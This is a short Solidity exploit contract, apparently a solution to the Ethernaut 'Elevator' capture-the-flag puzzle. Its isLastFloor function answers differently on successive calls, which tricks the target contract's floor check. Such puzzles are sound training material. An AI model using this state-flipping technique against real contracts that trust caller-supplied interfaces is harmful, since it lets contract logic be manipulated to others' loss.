// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Malicious is Building {

    Elevator public elevator;
    bool public interruptor;


    constructor(address elevator_) {
        elevator = Elevator(elevator_);
    }

    function attack(uint _floor) public {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint) external override returns (bool) {
        interruptor = !interruptor;
        return !interruptor;
    }

}